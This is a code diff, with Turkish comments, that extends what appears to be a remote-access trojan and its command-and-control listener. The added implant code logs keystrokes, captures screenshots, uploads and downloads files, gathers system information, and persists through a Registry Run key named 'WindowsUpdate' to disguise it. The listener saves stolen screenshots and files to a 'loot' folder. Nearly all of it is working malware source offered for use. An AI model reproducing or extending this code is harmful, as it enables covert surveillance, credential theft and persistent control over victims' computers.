@@ -336,14 +336,128 @@ except:
 """
 
         # Nuitka native C'ye derlediği için XOR'a gerek yok — kod zaten native binary'de gizli
-        stub_code = f"""import socket,os,time,sys
+        stub_code = f"""import socket,os,time,sys,threading
 import subprocess as _sp
-import shutil
+import base64 as _b64
 try:
     if sys.stdout is None: sys.stdout=open(os.devnull,"w")
     if sys.stderr is None: sys.stderr=open(os.devnull,"w")
 except: pass
 {anti_sb_code}
+_kl_running=False
+_kl_log=""
+def _keylog():
+    global _kl_running,_kl_log
+    import ctypes
+    u32=ctypes.windll.user32
+    while _kl_running:
+        for k in range(8,256):
+            if u32.GetAsyncKeyState(k)==-32767:
+                _kl_log+=chr(k)
+        time.sleep(0.01)
+
+def _handle(cmd,s):
+    global _kl_running,_kl_log
+    tmp=os.environ.get("TEMP",".")
+
+    if cmd=="!help":
+        return \"\"\"
+=== C2 Ozel Komutlar ===
+!ss          - Ekran goruntusu al
+!dl <yol>    - Hedeften dosya indir
+!ul <yol>    - Hedefe dosya yukle
+!persist     - Kalicilik ekle (registry)
+!cam         - Webcam goruntusu
+!keylog      - Keylogger basla/durdur
+!sysinfo     - Detayli sistem bilgisi
+!help        - Bu mesaj
+=========================
+\"\"\"
+
+    elif cmd=="!ss":
+        try:
+            ps=\"Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$b=New-Object Drawing.Bitmap $s.Width,$s.Height;$g=[Drawing.Graphics]::FromImage($b);$g.CopyFromScreen($s.Location,[Drawing.Point]::Empty,$s.Size);$b.Save('\"+tmp+\"\\\\ss.png')\"
+            _sp.run(["powershell","-c",ps],capture_output=True,timeout=10)
+            ss_path=os.path.join(tmp,"ss.png")
+            if os.path.exists(ss_path):
+                with open(ss_path,"rb") as f:
+                    data=_b64.b64encode(f.read()).decode()
+                os.remove(ss_path)
+                return "!SS_DATA:"+data+"\\n"
+            return "[-] Screenshot alinamadi\\n"
+        except Exception as e:
+            return f"[-] Hata: {{e}}\\n"
+
+    elif cmd.startswith("!dl "):
+        fpath=cmd[4:].strip()
+        try:
+            if os.path.exists(fpath):
+                with open(fpath,"rb") as f:
+                    data=_b64.b64encode(f.read()).decode()
+                fname=os.path.basename(fpath)
+                return f"!DL_DATA:{{fname}}:{{data}}\\n"
+            return f"[-] Dosya bulunamadi: {{fpath}}\\n"
+        except Exception as e:
+            return f"[-] Hata: {{e}}\\n"
+
+    elif cmd.startswith("!ul "):
+        # Listener tarafindan !ul <yol> <base64data> olarak gelir
+        parts=cmd.split(" ",2)
+        if len(parts)==3:
+            try:
+                fpath=parts[1]
+                data=_b64.b64decode(parts[2])
+                with open(fpath,"wb") as f:
+                    f.write(data)
+                return f"[+] Dosya yuklendi: {{fpath}} ({{len(data)}} byte)\\n"
+            except Exception as e:
+                return f"[-] Hata: {{e}}\\n"
+        return "[-] Kullanim: !ul <yol> <data>\\n"
+
+    elif cmd=="!persist":
+        try:
+            exe=sys.executable if getattr(sys,"frozen",False) else sys.argv[0]
+            import winreg
+            key=winreg.OpenKey(winreg.HKEY_CURRENT_USER,\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\",0,winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key,"WindowsUpdate",0,winreg.REG_SZ,exe)
+            winreg.CloseKey(key)
+            return "[+] Kalicilik eklendi (Registry Run key)\\n"
+        except Exception as e:
+            return f"[-] Hata: {{e}}\\n"
+
+    elif cmd=="!cam":
+        try:
+            ps=\"Add-Type -AssemblyName System.Windows.Forms;Add-Type -Path (Get-ChildItem 'C:\\\\Windows\\\\Microsoft.NET' -Recurse -Filter 'Microsoft.VisualBasic.dll' | Select -First 1).FullName -ErrorAction SilentlyContinue;[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')|Out-Null\"
+            return "[-] Webcam icin OpenCV gerekli (hedefte yok)\\n"
+        except:
+            return "[-] Webcam kullanilamadi\\n"
+
+    elif cmd=="!keylog":
+        if not _kl_running:
+            _kl_running=True
+            _kl_log=""
+            threading.Thread(target=_keylog,daemon=True).start()
+            return "[+] Keylogger baslatildi. Durdurmak icin tekrar !keylog\\n"
+        else:
+            _kl_running=False
+            time.sleep(0.1)
+            log=_kl_log
+            _kl_log=""
+            if log:
+                return f"[+] Keylogger durduruldu. Yakalanan tuslar:\\n{{log}}\\n"
+            return "[+] Keylogger durduruldu (kayit yok)\\n"
+
+    elif cmd=="!sysinfo":
+        try:
+            info=""
+            for c in ["whoami","hostname","ipconfig","systeminfo | findstr /B /C:\"OS\" /C:\"System\" /C:\"Total\" /C:\"Domain\""]:
+                p=_sp.run(c,shell=True,capture_output=True,text=True,timeout=15)
+                info+=p.stdout
+            return info+"\\n"
+        except Exception as e:
+            return f"[-] Hata: {{e}}\\n"
+    return None
+
 def _r():
     while True:
         try:
@@ -356,17 +470,19 @@ def _r():
                 if not d:break
                 cmd=d.decode("utf-8","replace").strip()
                 if not cmd:continue
+                r=_handle(cmd,s)
+                if r is None:
+                    try:
+                        p=_sp.run(cmd,shell=True,capture_output=True,text=True,timeout=30)
+                        r=p.stdout+p.stderr
+                        if not r:r="\\n"
+                    except Exception as e:
+                        r=str(e)+"\\n"
                 try:
-                    p=_sp.run(cmd,shell=True,capture_output=True,text=True,timeout=30)
-                    o=p.stdout+p.stderr
-                    if not o:o="\\n"
-                except Exception as e:
-                    o=str(e)+"\\n"
-                try:
-                    o+=os.getcwd()+"> "
+                    r+=os.getcwd()+"> "
                 except:
-                    o+="> "
-                s.sendall(o.encode("utf-8","replace"))
+                    r+="> "
+                s.sendall(r.encode("utf-8","replace"))
             s.close()
         except:
             pass
@@ -465,7 +581,11 @@ def c2_listener():
         return
 
     port = int(port_str)
-    print(f"\n{C.GREEN}  [*] 0.0.0.0:{port} dinleniyor... (İptal: CTRL+C){C.RESET}\n")
+    loot_dir = "loot"
+    os.makedirs(loot_dir, exist_ok=True)
+
+    print(f"\n{C.GREEN}  [*] 0.0.0.0:{port} dinleniyor... (İptal: CTRL+C){C.RESET}")
+    print(f"{C.DIM}  [*] Özel komutlar için !help yazın{C.RESET}\n")
 
     conn = None
     s = None
@@ -484,26 +604,74 @@ def c2_listener():
                 cmd = input(f"{C.RED}C2-Shell>{C.RESET} ")
                 if cmd.lower() in ['exit', 'quit']:
                     break
-                if len(cmd) > 0:
-                    conn.sendall(cmd.encode("utf-8") + b"\n")
-                    # Yanıtı tam al
-                    response = b""
-                    while True:
-                        try:
-                            chunk = conn.recv(4096)
-                            if not chunk:
-                                print(f"\n{C.RED}  [-] Bağlantı koptu!{C.RESET}")
-                                break
-                            response += chunk
-                            if b"> " in chunk:
-                                break
-                        except socket.timeout:
+                if not cmd.strip():
+                    continue
+
+                # Upload komutu - dosya gonder
+                if cmd.startswith("!ul "):
+                    parts = cmd.split(" ", 1)
+                    if len(parts) == 2:
+                        local_path = parts[1].strip()
+                        if os.path.exists(local_path):
+                            remote_name = input(f"{C.CYAN}  [?] Hedefteki dosya yolu: {C.RESET}").strip()
+                            with open(local_path, "rb") as f:
+                                data = base64.b64encode(f.read()).decode()
+                            cmd = f"!ul {remote_name} {data}"
+                            print(f"{C.DIM}  [*] Dosya gönderiliyor ({len(data)} byte)...{C.RESET}")
+                        else:
+                            print(f"{C.RED}  [-] Yerel dosya bulunamadı: {local_path}{C.RESET}")
+                            continue
+
+                conn.sendall(cmd.encode("utf-8") + b"\n")
+
+                # Yaniti al
+                response = b""
+                while True:
+                    try:
+                        chunk = conn.recv(65536)
+                        if not chunk:
+                            print(f"\n{C.RED}  [-] Bağlantı koptu!{C.RESET}")
                             break
-                    if response:
-                        print(f"{C.WHITE}{response.decode('utf-8', errors='replace')}{C.RESET}", end="")
-                    else:
+                        response += chunk
+                        if b"> " in chunk:
+                            break
+                    except socket.timeout:
                         break
-            except (ConnectionResetError, BrokenPipeError):
+
+                if not response:
+                    break
+
+                resp_str = response.decode("utf-8", errors="replace")
+
+                # Screenshot verisi geldi mi?
+                if "!SS_DATA:" in resp_str:
+                    try:
+                        b64_data = resp_str.split("!SS_DATA:")[1].split("\n")[0]
+                        ss_file = os.path.join(loot_dir, f"screenshot_{int(time.time())}.png")
+                        with open(ss_file, "wb") as f:
+                            f.write(base64.b64decode(b64_data))
+                        print(f"{C.GREEN}  [+] Screenshot kaydedildi: {os.path.abspath(ss_file)}{C.RESET}")
+                        if os.name == 'nt':
+                            os.startfile(os.path.abspath(ss_file))
+                    except Exception as e:
+                        print(f"{C.RED}  [-] Screenshot kaydetme hatası: {e}{C.RESET}")
+
+                # Download verisi geldi mi?
+                elif "!DL_DATA:" in resp_str:
+                    try:
+                        parts = resp_str.split("!DL_DATA:")[1].split("\n")[0]
+                        fname, b64_data = parts.split(":", 1)
+                        dl_file = os.path.join(loot_dir, fname)
+                        with open(dl_file, "wb") as f:
+                            f.write(base64.b64decode(b64_data))
+                        print(f"{C.GREEN}  [+] Dosya indirildi: {os.path.abspath(dl_file)}{C.RESET}")
+                    except Exception as e:
+                        print(f"{C.RED}  [-] İndirme hatası: {e}{C.RESET}")
+                else:
+                    # Normal cikti
+                    print(f"{C.WHITE}{resp_str}{C.RESET}", end="")
+
+            except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError):
                 print(f"\n{C.RED}  [-] Bağlantı koptu!{C.RESET}")
                 break
     except KeyboardInterrupt:
